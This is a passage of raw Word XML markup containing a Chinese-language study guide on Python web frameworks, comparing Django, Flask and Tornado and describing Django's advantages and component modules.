          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Flask </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>更为灵活。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75848588" w14:textId="77777777"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综上所述</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780398E8" w14:textId="000D3335"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1</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Django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>适合初学者或者小团队的快速开发，适合做管理类、博客类网站、或者功能十分复杂需求十分多的网站</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0DE8B4" w14:textId="5774BD12" w:rsidR="006B2B80" w:rsidRPr="00673A92" w:rsidRDefault="00673A92" w:rsidP="00673A9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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="00673A92">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>适合高度定制，适合访问量大，异步情况多的网站</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2111722E" w14:textId="0178EC7D" w:rsidR="00024E97" w:rsidRPr="003A0200" w:rsidRDefault="00AD41B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005</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3556072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是一个开放源代码的</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应用框架，由</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写成。采用了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MTV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的框架模式。使用这种架构，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序。它还包含许多功能强大的第三方插件，使得</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具有较强的可扩展性。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="405C7493" w14:textId="3A7C20BA" w:rsidR="00024E97" w:rsidRPr="003A0200" w:rsidRDefault="00024E9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w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>06</w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">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Django</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>开发有哪些优势</w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F10159" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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功能完善、要素齐全</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：该有的、可以没有的都有，自带大量常用工具和框架，无须你自定义、组合、增删及修改。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79CD73EB" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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完善的文档</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：经过十多年的发展和完善，</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有广泛的实践案例和完善的在线文档。开发者遇到问题时可以搜索在线文档寻求解决方案。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E4EE3D" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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lastRenderedPageBreak/>
        <w:t>强大的数据库访问组件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的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>层自带数据库</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组件，使得开发者无须学习其他数据库访问技术（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SQL</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pymysql</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SQLALchemy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>等）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E947B58" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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灵活的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>映射</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使用正则表达式管理</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映射，灵活性高。新版的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，进一步提高了</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编写的优雅性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614CA8FF" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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丰富的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Template</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模板语言</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：类似</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>jinjia</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模板语言，不但原生功能丰富，还可以自定义模板标签，并且与其</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的用法非常相似。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FC2A28" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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自带后台管理系统</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：只需要通过简单的几行配置和代码就可以实现一个完整的后台数据管理控制平台。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EA3378" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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完整的错误信息提示</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：在开发调试过程中如果出现运行错误或者异常，</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可以提供非常完整的错误信息帮助定位问题。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="7BC574DB" w14:textId="09FAA956" w:rsidR="00024E97" w:rsidRPr="003A0200" w:rsidRDefault="00024E9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w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>07</w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">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简述</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>项目的组成模块</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6120F5D6"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Project</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4883EB62"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Apps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E9E3E0"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Model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D7B09D"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URL Route</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179F3F45"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View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534AF170"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DTL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1D3871"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Admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650B3053" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Cache System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7949C1E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以下详细参考：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA1C93D" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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工程</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B1F3B6"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工程是承载了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>实例的所有设置的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>程序包。大部分情况下，一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>站点就是一个工程。工程内可以新建及存放该工程固有的应用，或者保存</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>站点的设置</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据库设置、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的选项设置、各应用的设置等</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FDF830D" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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应用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB3862E"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对于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>而言，应用之的是表示单一工程的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>应用的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>程序包。由于其本质就是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>程序包，因此方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>PYTHONPATH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>有效地任何位置都没有问题。这里最好尽量减少应用与工程、应用于应用之间的依赖关系，做到功能独立，以便在其他工程中重复利用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E2F613D" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="62"/>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模型</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB2226C"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  Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>提供了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>O/R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>映射工具，因此可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
